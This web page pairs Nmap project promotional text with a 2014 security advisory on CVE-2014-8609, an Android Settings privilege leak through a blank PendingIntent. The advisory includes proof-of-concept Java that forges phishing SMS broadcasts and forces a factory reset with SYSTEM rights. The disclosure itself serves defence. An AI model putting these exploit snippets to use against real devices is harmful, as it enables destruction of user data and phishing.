# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*

# CVE-2014-8609 Android Settings application privilege leakage vulnerability

---

*From*: "Wang,Tao(Scloud)" <wangtao12 () baidu com>

*Date*: Wed, 26 Nov 2014 02:54:07 +0000

---

```

INTRODUCTION
==================================
In Android <5.0 (and maybe >= 4.0), Settings application leaks Pendingintent with a blank base intent (neither the
component nor the action is explicitly set) to third party application, bad app can use this to broadcast intent with
the same permissions and identity of the Settings application, which runs as SYSTEM uid. Thus bad app can broadcast
sensitive intent with the permission of SYSTEM.

DETAILS
==================================
The vulnerability exists in the AddAccountSettings.java in the Settings app:
[https://android.googlesource.com/platform/packages/apps/Settings/+/android-4.4.4_r2.0.1/src/com/android/settings/accounts/AddAccountSettings.java](https://android.googlesource.com/platform/packages/apps/Settings/%2B/android-4.4.4_r2.0.1/src/com/android/settings/accounts/AddAccountSettings.java)

In the method addAccount, a PendingIntent is created by getBroadcast, the problem here is both the action and the
component are not explicitly set:

    private void addAccount(String accountType) {
        Bundle addAccountOptions = new Bundle();
        mPendingIntent = PendingIntent.getBroadcast(this, 0, new Intent(), 0);
        addAccountOptions.putParcelable(KEY_CALLER_IDENTITY, mPendingIntent);
        addAccountOptions.putBoolean(EXTRA_HAS_MULTIPLE_USERS, Utils.hasMultipleUsers(this));
        AccountManager.get(this).addAccount(
                accountType,
                null, /* authTokenType */
                null, /* requiredFeatures */
                addAccountOptions,
                null,
                mCallback,
                null /* handler */);
        mAddAccountCalled  = true;
    }

This PendingIntent is then stored in the addAccountOptions, which will be sent to another application.

According to android developer guides, this is not secure: (see
<http://developer.android.com/reference/android/app/PendingIntent.html>)
"By giving a PendingIntent to another application, you are granting it the right to perform the operation you have
specified as if the other application was yourself (with the same permissions and identity). As such, you should be
careful about how you build the PendingIntent: almost always, for example, the base Intent you supply should have the
component name explicitly set to one of your own components, to ensure it is ultimately sent there and nowhere else."

The bad app can register as an account authenticator by writing a service with the following intent filter (no
permission is needed):

    <intent-filter>
       <action android:name="android.accounts.AccountAuthenticator" />
    </intent-filter>

Then bad app can send an intent to Settings app and request Settings app to add account of requested account type:

    Intent intent = new Intent();
    intent.setComponent(new ComponentName("com.android.settings","com.android.settings.accounts.AddAccountSettings"));
    intent.setAction(Intent.ACTION_RUN);
    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    String authTypes[] = {AccountGeneral.ACCOUNT_TYPE};

    intent.putExtra("account_types", authTypes);
    startActivity(intent);

Upon receiving such an intent, Settings app will (automatically) call the method addAccount (whose vulnerability is
explained as above) and sent the pendingIntent to bad app's addAccount method.

Since the pendingIntent's actions and components are blank, bad app can fillin arbitrary action and extra information
into this intent and resending this pending intent, with the permission of SYSTEM.

For example, bad app can create a phishing SMS in the phone with the following POC:

public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[]
requiredFeatures, Bundle options) throws NetworkErrorException {
...
        PendingIntent pendingIntent = (PendingIntent)options.getParcelable("pendingIntent");
        Intent newIntent = new Intent();
        newIntent.setAction("android.provider.Telephony.SMS_RECEIVED");
       //filling phishing sms pdu data
        newIntent.putExtra( "pdus" , new Object[] { pdu });
        newIntent.putExtra("format", "3gpp");
        try {
            pendingIntent.send(mContext, 0, newIntent, null, null);
        } catch (CanceledException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

Or force the phone to factory reset to delete user's data with the following POC:

public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[]
requiredFeatures, Bundle options) throws NetworkErrorException {
    PendingIntent test = (PendingIntent)options.getParcelable("pendingIntent");
        Intent newIntent2 = new Intent("android.intent.action.MASTER_CLEAR");
        try {
        test.send(mContext, 0, newIntent2, null, null);
    } catch (CanceledException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

This has been fixed in android 5.0 (android bug id 17356824)
[https://android.googlesource.com/platform/packages/apps/Settings/+/f5d3e74ecc2b973941d8adbe40c6b23094b5abb7](https://android.googlesource.com/platform/packages/apps/Settings/%2B/f5d3e74ecc2b973941d8adbe40c6b23094b5abb7)
